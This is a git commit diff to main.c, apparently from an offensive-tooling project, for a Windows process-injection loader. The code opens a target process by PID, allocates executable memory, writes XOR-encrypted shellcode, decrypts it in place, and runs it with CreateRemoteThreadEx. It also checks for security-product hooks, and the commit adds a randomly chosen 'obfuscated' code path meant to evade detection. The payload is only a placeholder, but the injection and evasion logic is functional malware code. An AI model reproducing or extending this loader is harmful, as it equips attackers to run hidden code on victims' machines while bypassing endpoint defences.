cc5935adc8c5344d40f73689ff1497af49eb4261
44xo <166061519+44xo@users.noreply.github.com>
2024-07-23 15:34:54 -0600

    Update main.c

--- main.c
+++ main.c
@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <stdlib.h>
+#include <time.h>
 
 #define i(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
 #define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
@@ -32,7 +34,6 @@ BOOL IsFunctionHooked(void* functionAddress) {
     return FALSE;
 }
 
-
 int main(int argc, char* argv[]) {
     // Shellcode (example, must be replaced with actual shellcode)
     unsigned char shellcode[] = "\x8a\x2d\..."; // Shellcode here
@@ -48,77 +49,164 @@ int main(int argc, char* argv[]) {
     DWORD PID = atoi(argv[1]);
     i("Inserted PID: %d", PID);
 
-    void* openProcessAddr = GetFunctionAddress("OpenProcess");
-    if (openProcessAddr == NULL || IsFunctionHooked(openProcessAddr)) {
-        e("Failed to retrieve a clean OpenProcess function address.");
-        return 1;
-    }
-    HANDLE(WINAPI* OpenProcess)(DWORD, BOOL, DWORD) = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))openProcessAddr;
+    // Randomly choose between different implementation strategies
+    srand((unsigned int)time(NULL));
+    int strategy = rand() % 2;
 
-    i("Trying to get the handle of the process: %d", PID);
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-    if (hProcess == NULL) {
-        e("Not able to get the handle of process %d", PID);
-        return 1;
-    }
-    s("Got the handle of the process: %d", PID);
-    i("Process handle: 0x%p", hProcess);
+    if (strategy == 0) {
+        // Strategy 1: Normal implementation
+        void* openProcessAddr = GetFunctionAddress("OpenProcess");
+        if (openProcessAddr == NULL || IsFunctionHooked(openProcessAddr)) {
+            e("Failed to retrieve a clean OpenProcess function address.");
+            return 1;
+        }
+        HANDLE(WINAPI* OpenProcess)(DWORD, BOOL, DWORD) = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))openProcessAddr;
 
-    void* virtualAllocExAddr = GetFunctionAddress("VirtualAllocEx");
-    if (virtualAllocExAddr == NULL || IsFunctionHooked(virtualAllocExAddr)) {
-        e("Failed to retrieve a clean VirtualAllocEx function address.");
-        return 1;
-    }
-    LPVOID(WINAPI* VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))virtualAllocExAddr;
+        i("Trying to get the handle of the process: %d", PID);
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+        if (hProcess == NULL) {
+            e("Not able to get the handle of process %d", PID);
+            return 1;
+        }
+        s("Got the handle of the process: %d", PID);
+        i("Process handle: 0x%p", hProcess);
 
-    i("Trying to allocate buffer in the process's virtual memory...");
-    LPVOID AllocBuffer = VirtualAllocEx(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    if (AllocBuffer == NULL) {
-        e("Failed to allocate buffer.");
-        return 1;
-    }
-    s("Successfully allocated the buffer into the virtual space of the process");
-    i("Address: 0x%p", AllocBuffer);
+        void* virtualAllocExAddr = GetFunctionAddress("VirtualAllocEx");
+        if (virtualAllocExAddr == NULL || IsFunctionHooked(virtualAllocExAddr)) {
+            e("Failed to retrieve a clean VirtualAllocEx function address.");
+            return 1;
+        }
+        LPVOID(WINAPI* VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))virtualAllocExAddr;
 
-    void* writeProcessMemoryAddr = GetFunctionAddress("WriteProcessMemory");
-    if (writeProcessMemoryAddr == NULL || IsFunctionHooked(writeProcessMemoryAddr)) {
-        e("Failed to retrieve a clean WriteProcessMemory function address.");
-        return 1;
-    }
-    BOOL(WINAPI* WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))writeProcessMemoryAddr;
+        i("Trying to allocate buffer in the process's virtual memory...");
+        LPVOID AllocBuffer = VirtualAllocEx(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+        if (AllocBuffer == NULL) {
+            e("Failed to allocate buffer.");
+            return 1;
+        }
+        s("Successfully allocated the buffer into the virtual space of the process");
+        i("Address: 0x%p", AllocBuffer);
 
-    if (WriteProcessMemory(hProcess, AllocBuffer, shellcode, sizeshellcode, NULL) == 0) {
-        e("Unable to write the shellcode.");
-        return 1;
-    }
-    s("Wrote shellcode to the buffer!");
+        void* writeProcessMemoryAddr = GetFunctionAddress("WriteProcessMemory");
+        if (writeProcessMemoryAddr == NULL || IsFunctionHooked(writeProcessMemoryAddr)) {
+            e("Failed to retrieve a clean WriteProcessMemory function address.");
+            return 1;
+        }
+        BOOL(WINAPI* WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))writeProcessMemoryAddr;
 
-    // Decrypt the shellcode in memory
-    BYTE value;
-    char key[] = "veryhardkey";
-    for (int i = 0; i < sizeshellcode - 1; i++) {
-        ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
-        value = (value ^ key[i % (sizeof(key) - 1)]);
-        WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
-    }
+        if (WriteProcessMemory(hProcess, AllocBuffer, shellcode, sizeshellcode, NULL) == 0) {
+            e("Unable to write the shellcode.");
+            return 1;
+        }
+        s("Wrote shellcode to the buffer!");
 
-    void* createRemoteThreadAddr = GetFunctionAddress("CreateRemoteThreadEx");
-    if (createRemoteThreadAddr == NULL || IsFunctionHooked(createRemoteThreadAddr)) {
-        e("Failed to retrieve a clean CreateRemoteThreadEx function address.");
-        return 1;
-    }
-    HANDLE(WINAPI* CreateRemoteThreadEx)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD) = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD))createRemoteThreadAddr;
+        // Decrypt the shellcode in memory
+        BYTE value;
+        char key[] = "veryhardkey";
+        for (int i = 0; i < sizeshellcode - 1; i++) {
+            ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
+            value = (value ^ key[i % (sizeof(key) - 1)]);
+            WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
+        }
 
-    DWORD TID;
-    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, NULL, &TID);
-    if (hThread == NULL) {
-        e("Failed to create remote thread.");
-        return 1;
-    }
+        void* createRemoteThreadAddr = GetFunctionAddress("CreateRemoteThreadEx");
+        if (createRemoteThreadAddr == NULL || IsFunctionHooked(createRemoteThreadAddr)) {
+            e("Failed to retrieve a clean CreateRemoteThreadEx function address.");
+            return 1;
+        }
+        HANDLE(WINAPI* CreateRemoteThreadEx)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD) = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD))createRemoteThreadAddr;
 
-    i("Thread invoked!");
-    i("Thread handle: 0x%p", hThread);
-    i("Thread ID: %d", TID);
+        DWORD TID;
+        HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, NULL, &TID);
+        if (hThread == NULL) {
+            e("Failed to create remote thread.");
+            return 1;
+        }
+
+        i("Thread invoked!");
+        i("Thread handle: 0x%p", hThread);
+        i("Thread ID: %d", TID);
+
+    } else {
+        // Strategy 2: Obfuscated implementation
+        void* funcAddr;
+        HANDLE(WINAPI* funcPtr)(DWORD, BOOL, DWORD);
+        LPVOID(WINAPI* allocFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+        BOOL(WINAPI* writeFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+        HANDLE(WINAPI* threadFunc)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD);
+
+        funcAddr = GetFunctionAddress("OpenProcess");
+        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
+            e("Failed to retrieve a clean OpenProcess function address.");
+            return 1;
+        }
+        funcPtr = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))funcAddr;
+
+        i("Trying to get the handle of the process: %d", PID);
+        HANDLE hProcess = funcPtr(PROCESS_ALL_ACCESS, FALSE, PID);
+        if (hProcess == NULL) {
+            e("Not able to get the handle of process %d", PID);
+            return 1;
+        }
+        s("Got the handle of the process: %d", PID);
+        i("Process handle: 0x%p", hProcess);
+
+        funcAddr = GetFunctionAddress("VirtualAllocEx");
+        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
+            e("Failed to retrieve a clean VirtualAllocEx function address.");
+            return 1;
+        }
+        allocFunc = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))funcAddr;
+
+        i("Trying to allocate buffer in the process's virtual memory...");
+        LPVOID AllocBuffer = allocFunc(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+        if (AllocBuffer == NULL) {
+            e("Failed to allocate buffer.");
+            return 1;
+        }
+        s("Successfully allocated the buffer into the virtual space of the process");
+        i("Address: 0x%p", AllocBuffer);
+
+        funcAddr = GetFunctionAddress("WriteProcessMemory");
+        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
+            e("Failed to retrieve a clean WriteProcessMemory function address.");
+            return 1;
+        }
+        writeFunc = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))funcAddr;
+
+        if (writeFunc(hProcess, AllocBuffer, shellcode, sizeshellcode, NULL) == 0) {
+            e("Unable to write the shellcode.");
+            return 1;
+        }
+        s("Wrote shellcode to the buffer!");
+
+        // Decrypt the shellcode in memory
+        BYTE value;
+        char key[] = "veryhardkey";
+        for (int i = 0; i < sizeshellcode - 1; i++) {
+            ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
+            value = (value ^ key[i % (sizeof(key) - 1)]);
+            writeFunc(hProcess, (LPVOID)((uintptr_t)AllocBuffer + i), &value, sizeof(value), NULL);
+        }
+
+        funcAddr = GetFunctionAddress("CreateRemoteThreadEx");
+        if (funcAddr == NULL || IsFunctionHooked(funcAddr)) {
+            e("Failed to retrieve a clean CreateRemoteThreadEx function address.");
+            return 1;
+        }
+        threadFunc = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, LPDWORD))funcAddr;
+
+        DWORD TID;
+        HANDLE hThread = threadFunc(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, NULL, &TID);
+        if (hThread == NULL) {
+            e("Failed to create remote thread.");
+            return 1;
+        }
+
+        i("Thread invoked!");
+        i("Thread handle: 0x%p", hThread);
+        i("Thread ID: %d", TID);
+    }
 
     return 0;
 }
